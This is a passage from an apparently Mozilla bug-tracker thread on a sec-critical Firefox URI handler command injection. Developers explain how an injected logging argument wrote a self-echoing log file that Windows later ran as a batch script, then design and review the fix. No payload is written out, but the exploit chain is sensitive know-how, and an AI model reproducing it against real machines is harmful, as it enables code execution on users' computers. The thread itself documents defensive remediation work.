<p>is written to disk, and its contents include its own path as a result of the Widget logging for &quot;ResolveJunctionPointsAndSymLinks: Resolving path:&quot; (from <a href="https://searchfox.org/mozilla-central/rev/ec806131cb7bcd1c26c254d25cd5ab8a61b2aeb6/widget/windows/WinUtils.cpp#1898" rel="nofollow">https://searchfox.org/mozilla-central/rev/ec806131cb7bcd1c26c254d25cd5ab8a61b2aeb6/widget/windows/WinUtils.cpp#1898</a> ). Then when the user logs on, the file is run as a bat file and, although there&#39;s a load of other gunk that gets ignored / throws errors, apparently bat processing is lenient enough that this line actually manages to run calc (or whatever else is at the end of that curl). Wow.</p>
</div></div><div class="change-set" id="c15"><div class="comment" data-id="14296898" data-no="15"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-15" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_428608" id="a6270_1689"><img src="https://secure.gravatar.com/avatar/1f41f3ef916e1c1fc9401cf3212a6708?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_428608" id="a6270_1689"><a class="email " href="/user_profile?user_id=428608" > <span class="fna">Frederik Braun [:freddy] - vacation (back Nov 1st)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-15"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-15" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#c15">Comment 15</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-13 05:31 PDT" data-time="1565699509">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-15">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-15" data-comment-id="14296898" data-ismarkdown="true" ><p>(In reply to :Gijs (he/him) from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed" href="/show_bug.cgi?id=1572838#c6" title="VERIFIED FIXED - URI Handler Command Injection Vulnerability [iDefense V-bsk2ottbf1]">comment #6</a>)</p>
<blockquote>
<ol start="2">
<li>The email notes that <code>LogCommandLineHandler.cpp</code> doesn&#39;t check osint, but it should. I think this assessment is correct. See <a class="bz_bug_link
          bz_status_VERIFIED bz_closed" href="/show_bug.cgi?id=1530103" title="VERIFIED FIXED - URI handler Remote Code Execution via command line parameter injection in Firefox">bug 1530103</a>. We should probably audit if there are any other handlers that need checking here, and ideally do some work to make this a safe-by-default thing instead of forcing every handler to opt in. I did some searching at the time but didn&#39;t find this code; unsure why but either way it needs sorting out. Paul/Freddy, can you check?</li>
</ol>
</blockquote>
</div><div class="activity"><div class="change">Flags: needinfo?(fbraun)</div></div></div><div class="change-set" id="c16"><div class="comment" data-id="14299393" data-no="16"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-16" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a6270_1689"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_159069" id="a6270_1689"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-16"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-16" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#c16">Comment 16</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-14 03:46 PDT" data-time="1565779570">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-16">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-9085406"
         class="attachment patch obsolete"
         data-id="9085406" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="scrubargs.txt">
      <meta itemprop="contentSize" content="2678">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=9085406">
          <a class="link" href="attachment.cgi?id=9085406&amp;action=diff">
        <span id="att-9085406-description" itemprop="description">Scrub args</span></a> (obsolete)
        — <a href="attachment.cgi?id=9085406&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1572838&attachment=9085406">Splinter Review</a>
      </div>
    </div>

  
    <div
        class="comment-text markdown-body "
        id="ct-16" data-comment-id="14299393" data-ismarkdown="true" ><p>I&#39;m tempted to suggest we do something like this. It probably wants factoring out into the CmdLineAndEnvUtils header file so we can also call it from the launcher process on Windows, and then we can just remove all the CheckOSInt flags and/or manual handling like in <a href="https://searchfox.org/mozilla-central/rev/c7e8bc4996f979e5876b33afae3de3b1ab4f3ae1/toolkit/profile/nsToolkitProfileService.cpp#1335-1344" rel="nofollow">https://searchfox.org/mozilla-central/rev/c7e8bc4996f979e5876b33afae3de3b1ab4f3ae1/toolkit/profile/nsToolkitProfileService.cpp#1335-1344</a> .</p>
<p>Dave and Nathan, does that sound right?</p>
<p>The only concern I have about that atm is that previously, running:</p>
<p><code>firefox.exe -osint -P foo -url google.com</code></p>
<p>would (AFAICT) error out and not load anything. With this patch, it just opens the default profile for that install and loads google.com . The -P flag gets ignored. I&#39;m wondering if instead of carrying on our merry way, we should always exit early if unexpected flags get combined with <code>-osint</code>. Thoughts?</p>
</div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=9085406&amp;action=edit"
           title="Scrub args"
           class=""
        >Attachment #9085406</a> -
        Flags: feedback?(nfroyd)</div><div class="change">
        <a href="/attachment.cgi?id=9085406&amp;action=edit"
           title="Scrub args"
           class=""
        >Attachment #9085406</a> -
        Flags: feedback?(dtownsend)</div></div></div><div class="change-set" id="c17"><div class="comment" data-id="14300253" data-no="17"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-17" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_91159" id="a6270_1689"><img src="https://secure.gravatar.com/avatar/8f56e46f0120d9477f8f320991a2196a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_91159" id="a6270_1689"><a class="email " href="/user_profile?user_id=91159" > <span class="fna">Dave Townsend [:mossop]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-17"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-17" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#c17">Comment 17</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-14 10:03 PDT" data-time="1565802206">2 years ago</span>
          </div>&bull;
<div class="change-revisions">
  <a href="/page.cgi?id=comment-revisions.html&amp;bug_id=1572838&amp;comment_id=14300253"
     title="1 revision">Edited</a>
</div>
        </td>
      </tr>

      <tr id="ctag-17">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-17" data-comment-id="14300253">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=9085406" name="attach_9085406" title="Scrub args">attachment 9085406</a> <a href="/attachment.cgi?id=9085406&amp;action=edit" title="Scrub args">[details]</a> <a href="/attachment.cgi?id=9085406&amp;action=diff" title="Scrub args">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1572838&amp;attachment=9085406'>[review]</a>
Scrub args

Review of <span class="bz_obsolete"><a href="/attachment.cgi?id=9085406" name="attach_9085406" title="Scrub args">attachment 9085406</a> <a href="/attachment.cgi?id=9085406&amp;action=edit" title="Scrub args">[details]</a> <a href="/attachment.cgi?id=9085406&amp;action=diff" title="Scrub args">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1572838&amp;attachment=9085406'>[review]</a>:
-----------------------------------------------------------------

I think we can and should be stricter here. From speaking with Matt the command line we should get from other applications has for years been `[&quot;-osint&quot;, &quot;-url&quot;, &quot;&lt;url&gt;&quot;]` so lets validate against exactly that.

1. `if !CheckArgExists(&quot;osint&quot;) return`
2. `if gArgc != 4 crash`
3. `if gArgv[1] != &quot;-osint&quot; crash`
4. `if gArgv[2] != &quot;-url&quot; crash`
5. `strip gArgv[1]`

And then remove any other -osint handling elsewhere.</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=9085406&amp;action=edit"
           title="Scrub args"
           class=""
        >Attachment #9085406</a> -
        Flags: feedback?(dtownsend) &rarr; feedback-</div></div></div><div class="change-set" id="c18"><div class="comment" data-id="14301988" data-no="18"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-18" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_269762" id="a6270_1689"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_269762" id="a6270_1689"><a class="email " href="/user_profile?user_id=269762" > <span class="fna">Honza Bambas (:mayhemer)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-18"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-18" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#c18">Comment 18</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-15 05:42 PDT" data-time="1565872976">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-18">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-18" data-comment-id="14301988" data-ismarkdown="true" ><p>LogModule::Init is called on number of places.  I&#39;ve done it that way because normal command line handling happens too late.  Beside your fix, to further mitigate, would always appending <code>.log</code> (if not already set) to the log file name inside the logging code be safer?  Assuming that <code>.log</code> is possibly safer than arbitrary extension.  We could also have <code>.mozlog</code> extension to prevent <code>.log</code> handlers to spawn.</p>
</div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(honzab.moz)</span></div></div></div><div class="change-set" id="c19"><div class="comment" data-id="14302204" data-no="19"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-19" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a6270_1689"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_159069" id="a6270_1689"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-19"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-19" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#c19">Comment 19</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-15 07:48 PDT" data-time="1565880533">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-19">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-19" data-comment-id="14302204" data-ismarkdown="true" ><p>(In reply to Honza Bambas (:mayhemer) from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed" href="/show_bug.cgi?id=1572838#c18" title="VERIFIED FIXED - URI Handler Command Injection Vulnerability [iDefense V-bsk2ottbf1]">comment #18</a>)</p>
<blockquote>
<p>Beside your fix, to further mitigate, would always appending <code>.log</code> (if not already set) to the log file name inside the logging code be safer?  Assuming that <code>.log</code> is possibly safer than arbitrary extension.  We could also have <code>.mozlog</code> extension to prevent <code>.log</code> handlers to spawn.</p>
</blockquote>
<p>This seems like a sensible idea. If you&#39;re able to come up with a patch for that, I&#39;ll try and get something together for the suggestion in <a class="bz_bug_link
          bz_status_VERIFIED bz_closed" href="/show_bug.cgi?id=1572838#c17" title="VERIFIED FIXED - URI Handler Command Injection Vulnerability [iDefense V-bsk2ottbf1]">comment #17</a>.</p>
</div></div><div class="change-set" id="a511571_1689"><div class="change" id="aa511571_1689">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a511571_1689"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_1689" id="a511571_1689"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a511571_1689"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a511571_1689">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#a511571_1689">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-15 10:48 PDT" data-time="1565891309">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Keywords: <a href="/buglist.cgi?keywords=csectype-priv-escalation&amp;resolution=---">csectype-priv-escalation</a>, 
          
            <a href="/buglist.cgi?keywords=sec-critical&amp;resolution=---">sec-critical</a></div></div></div><div class="change-set" id="a585161_159069"><div class="change" id="aa585161_159069">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a585161_159069"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_159069" id="a585161_159069"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a585161_159069"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a585161_159069">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#a585161_159069">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-16 07:14 PDT" data-time="1565964899">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Assignee: nobody &rarr; gijskruitbosch+bugs</div><div class="change">Status: NEW &rarr; ASSIGNED</div></div></div><div class="change-set" id="c20"><div class="comment" data-id="14304501" data-no="20"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-20" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a585161_159069"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_159069" id="a585161_159069"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-20"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-20" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#c20">Comment 20</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-16 07:15 PDT" data-time="1565964912">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-20">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-9086057"
         class="attachment"
         data-id="9086057" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="phabricator-D42311-url.txt">
      <meta itemprop="contentSize" content="47">
      <meta itemprop="encodingFormat" content="text/x-phabricator-request">
      <div class="label">
        Attached file
          <a class="link" href="attachment.cgi?id=9086057" itemprop="contentUrl">
        <span id="att-9086057-description" itemprop="description">Bug 1572838 - ensure osint commandline args are passed appropriately, r?mhowell!,Mossop!</span></a>
        — <a href="attachment.cgi?id=9086057&amp;action=edit" itemprop="url">Details</a>
      </div>
    </div></div><div class="change-set" id="a585184_159069"><div class="change" id="aa585184_159069">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a585184_159069"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_159069" id="a585184_159069"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a585184_159069"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a585184_159069">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#a585184_159069">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-16 07:15 PDT" data-time="1565964922">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=9085406&amp;action=edit"
           title="Scrub args"
           class=""
        >Attachment #9085406</a> -
        Attachment is obsolete: true</div><div class="change">
        <a href="/attachment.cgi?id=9085406&amp;action=edit"
           title="Scrub args"
           class=""
        >Attachment #9085406</a> -
        Flags: <span class="activity-deleted">feedback?(nfroyd)</span></div></div></div><div class="change-set" id="c21"><div class="comment" data-id="14304616" data-no="21"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-21" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_269762" id="a585184_159069"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_269762" id="a585184_159069"><a class="email " href="/user_profile?user_id=269762" > <span class="fna">Honza Bambas (:mayhemer)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-21"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-21" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#c21">Comment 21</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-16 08:05 PDT" data-time="1565967956">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-21">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-21" data-comment-id="14304616" data-ismarkdown="true" ><p>I&#39;m preparing the patch for <code>.mozlog</code> extension appending.  Should we land it as part of this bug or rather in a separate one?</p>
</div></div><div class="change-set" id="c22"><div class="comment" data-id="14308287" data-no="22"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-22" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a585184_159069"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_159069" id="a585184_159069"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-22"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-22" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#c22">Comment 22</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-19 00:07 PDT" data-time="1566198427">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-22">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-22" data-comment-id="14308287" data-ismarkdown="true" ><p>(In reply to Honza Bambas (:mayhemer) from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed" href="/show_bug.cgi?id=1572838#c21" title="VERIFIED FIXED - URI Handler Command Injection Vulnerability [iDefense V-bsk2ottbf1]">comment #21</a>)</p>
<blockquote>
<p>I&#39;m preparing the patch for <code>.mozlog</code> extension appending.  Should we land it as part of this bug or rather in a separate one?</p>
</blockquote>
<p>I think a separate one would be fine and would probably avoid attracting attention to which exact commandline flag led to exploits via -osint.</p>
</div></div><div class="change-set" id="c23"><div class="comment" data-id="14308318" data-no="23"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-23" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a585184_159069"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_159069" id="a585184_159069"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-23"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-23" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#c23">Comment 23</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-19 00:41 PDT" data-time="1566200488">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-23">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-23" data-comment-id="14308318" data-ismarkdown="true" ><p>Comment on <span class=""><a href="/attachment.cgi?id=9086057" name="attach_9086057" title="Bug 1572838 - ensure osint commandline args are passed appropriately, r?mhowell!,Mossop!">attachment 9086057</a> <a href="/attachment.cgi?id=9086057&amp;action=edit" title="Bug 1572838 - ensure osint commandline args are passed appropriately, r?mhowell!,Mossop!">[details]</a></span><br>
<a class="bz_bug_link
          bz_status_VERIFIED bz_closed" href="/show_bug.cgi?id=1572838" title="VERIFIED FIXED - URI Handler Command Injection Vulnerability [iDefense V-bsk2ottbf1]">Bug 1572838</a> - ensure osint commandline args are passed appropriately, r?mhowell!,Mossop!</p>
<h3>Security Approval Request</h3>
<ul>
<li><strong>How easily could an exploit be constructed based on the patch?</strong>: Not super easily; the patch indicates that there&#39;s some reason to distrust other commandline arguments more strongly than we do now when using the <code>-osint</code> flag, and comments flag up that other apps might not escape commandlines correctly. IMO the combined use of a moz-log file in a location where Windows is guaranteed to start it next session, and the use of a log module that then echoes its own filename, and the fact that Windows batch scripting allows so much junk in the file and still executes, is obscure enough that it&#39;s not particularly obvious just from a patch that only restricts what we do with <code>-osint</code> to the bare minimum - it&#39;s obvious where to look, but there&#39;s quite some work to go from there.</li>
<li><strong>Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?</strong>: No</li>
<li><strong>Which older supported branches are affected by this flaw?</strong>: esr68, release and beta</li>
<li><strong>If not all supported branches, which bug introduced the flaw?</strong>: <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1451686" title="RESOLVED FIXED - Change -MOZ_LOG* arguments to be in the form -MOZ_LOG=modules (and not -MOZ_LOG &lt;space&gt; modules)">Bug 1451686</a></li>
<li><strong>Do you have backports for the affected branches?</strong>: No</li>
<li><strong>If not, how different, hard to create, and risky will they be?</strong>: Not hard - beta rebases without conflicts, I expect esr68 not to be too different.</li>
<li><strong>How likely is this patch to cause regressions; how much testing does it need?</strong>: Although the code is reasonably well-understood and I don&#39;t expect issues, QA should check that a fresh install as well as upgrades still open links correctly when set as default browser, on win7 as well as win10.</li>
</ul>
</div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=9086057&amp;action=edit"
           title="Bug 1572838 - ensure osint commandline args are passed appropriately, r?mhowell!,Mossop!"
           class=""
        >Attachment #9086057</a> -
        Flags: sec-approval?</div></div></div><div class="change-set" id="c24"><div class="comment" data-id="14308625" data-no="24"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-24" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_269762" id="a585184_159069"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_269762" id="a585184_159069"><a class="email " href="/user_profile?user_id=269762" > <span class="fna">Honza Bambas (:mayhemer)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-24"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-24" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#c24">Comment 24</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-19 04:49 PDT" data-time="1566215393">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-24">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-24" data-comment-id="14308625" data-ismarkdown="true" ><p>(In reply to :Gijs (he/him) from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed" href="/show_bug.cgi?id=1572838#c22" title="VERIFIED FIXED - URI Handler Command Injection Vulnerability [iDefense V-bsk2ottbf1]">comment #22</a>)</p>
<blockquote>
<p>I think a separate one would be fine and would probably avoid attracting attention to which exact commandline flag led to exploits via -osint.</p>
</blockquote>
<p>Agree. <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1574882" title="RESOLVED FIXED - Add `.moz_log` extension to log files automatically to have a distinction">Bug 1574882</a>.</p>
</div></div><div class="change-set" id="c25"><div class="comment" data-id="14310004" data-no="25"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-25" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a585184_159069"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_1689" id="a585184_159069"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-25"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-25" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#c25">Comment 25</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-19 14:23 PDT" data-time="1566249783">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-25">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-25" data-comment-id="14310004" data-ismarkdown="true" ><p>Do we need to worry about BrowserContentHandler.jsm?<br>
